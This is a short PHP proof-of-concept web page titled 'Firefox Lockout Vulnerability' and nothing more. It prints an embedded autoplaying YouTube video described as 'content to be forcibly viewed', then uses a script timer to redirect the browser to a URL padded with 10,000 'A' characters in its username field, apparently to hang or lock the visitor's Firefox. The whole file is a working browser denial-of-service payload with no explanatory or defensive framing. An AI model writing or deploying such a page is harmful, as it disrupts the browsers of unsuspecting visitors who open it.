<?php
$exploit=str_repeat(chr(0x41),10000);  //////// 
$location="http://Username".$exploit.":Password@Firefox.com";
echo "<center><h1>Firefox Lockout Vulnerability</h1>";
//Content to be forcibly viewed
echo "<iframe width=854 height=480 src=https://www.youtube.com/embed/QH2-TGUlwu4?autoplay=1 frameborder=0 allowfullscreen></iframe></center>";
//End
echo "<script>setTimeout(\"location.href ='".$location."';\",10000);</script>";
?>
